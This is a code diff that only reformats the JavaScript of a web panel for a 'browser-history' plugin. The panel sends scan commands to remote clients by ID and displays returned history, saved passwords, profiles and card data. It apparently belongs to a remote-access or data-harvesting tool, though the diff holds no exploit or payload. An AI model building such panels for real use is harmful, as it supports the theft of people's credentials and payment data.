@@ -1,16 +1,16 @@
-const params = new URLSearchParams(window.location.search);
-const clientIdInput = document.getElementById("client-id");
-const scanBtn = document.getElementById("scan-btn");
-const statusPill = document.getElementById("status-pill");
-const countBadge = document.getElementById("count-badge");
-const pwdCountBadge = document.getElementById("pwd-count-badge");
+const params            = new URLSearchParams(window.location.search);
+const clientIdInput     = document.getElementById("client-id");
+const scanBtn           = document.getElementById("scan-btn");
+const statusPill        = document.getElementById("status-pill");
+const countBadge        = document.getElementById("count-badge");
+const pwdCountBadge     = document.getElementById("pwd-count-badge");
 const profileCountBadge = document.getElementById("profile-count-badge");
-const cardCountBadge = document.getElementById("card-count-badge");
-const resultsArea = document.getElementById("results-area");
-const passwordsArea = document.getElementById("passwords-area");
-const profilesArea = document.getElementById("profiles-area");
-const cardsArea = document.getElementById("cards-area");
-const logEl = document.getElementById("log");
+const cardCountBadge    = document.getElementById("card-count-badge");
+const resultsArea       = document.getElementById("results-area");
+const passwordsArea     = document.getElementById("passwords-area");
+const profilesArea      = document.getElementById("profiles-area");
+const cardsArea         = document.getElementById("cards-area");
+const logEl             = document.getElementById("log");
 
 const pluginId = "browser-history";
 const clientId = params.get("clientId") || "";
@@ -25,7 +25,7 @@ function log(line) {
   logEl.textContent = `${ts}  ${line}\n` + logEl.textContent;
 }
 
-// ─── Status pill ──────────────────────────────────────────────────────────────
+// ─── Status pill helpers ───────────────────────────────────────────────────────
 
 function setStatus(text, cls) {
   statusPill.textContent = text;
@@ -39,7 +39,7 @@ function escapeHtml(s) {
 }
 
 function extractDomain(url) {
-  try { return new URL(url).hostname.replace(/^www\./, ""); } catch(_) { return url; }
+  try { return new URL(url).hostname.replace(/^www\./,""); } catch(_) { return url; }
 }
 
 function groupByFirstLetter(items, keyFn) {
@@ -59,16 +59,29 @@ async function sendPluginEvent(event, payload) {
   if (!clientId) { log("Missing clientId"); return; }
   const res = await fetch(
     `/api/clients/${encodeURIComponent(clientId)}/plugins/${pluginId}/event`,
-    { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ event, payload }) }
+    {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ event, payload }),
+    }
   );
-  if (!res.ok) { log(`sendEvent failed: ${res.status} ${await res.text()}`); }
+  if (!res.ok) {
+    const text = await res.text();
+    log(`sendEvent failed: ${res.status} ${text}`);
+  }
 }
 
 async function pollEvents() {
   if (!clientId) return;
   try {
-    const res = await fetch(`/api/clients/${encodeURIComponent(clientId)}/plugins/${pluginId}/events`);
-    if (!res.ok) { log(`poll failed: ${res.status}`); return; }
+    const res = await fetch(
+      `/api/clients/${encodeURIComponent(clientId)}/plugins/${pluginId}/events`,
+      { method: "GET" }
+    );
+    if (!res.ok) {
+      log(`poll failed: ${res.status}`);
+      return;
+    }
     const data = await res.json();
     for (const item of data.events || []) {
       handleIncomingEvent(item.event, item.payload);
@@ -78,7 +91,7 @@ async function pollEvents() {
   }
 }
 
-// ─── Render ───────────────────────────────────────────────────────────────────
+// ─── Render results ────────────────────────────────────────────────────────────
 
 function renderPasswords(passwords, total) {
   pwdCountBadge.textContent = String(total);
@@ -128,7 +141,7 @@ function renderResults(entries, total) {
   }).join("");
 }
 
-// ─── Event handler ─────────────────────────────────────────────────────────────
+// ─── Handle incoming plugin events ────────────────────────────────────────────
 
 function handleIncomingEvent(event, payload) {
   if (event === "ready") {
@@ -154,7 +167,7 @@ function handleIncomingEvent(event, payload) {
   }
 }
 
-// ─── Polling ──────────────────────────────────────────────────────────────────
+// ─── Polling control ──────────────────────────────────────────────────────────
 
 function startPolling() {
   stopPolling();
@@ -169,7 +182,10 @@ function stopPolling() {
 // ─── Scan button ──────────────────────────────────────────────────────────────
 
 scanBtn.addEventListener("click", async () => {
-  if (!clientId) { log("No clientId in URL"); return; }
+  if (!clientId) {
+    log("No clientId in URL");
+    return;
+  }
   scanBtn.disabled = true;
   setStatus("Scanning\u2026", "status-scanning");
   log("Manual scan triggered");
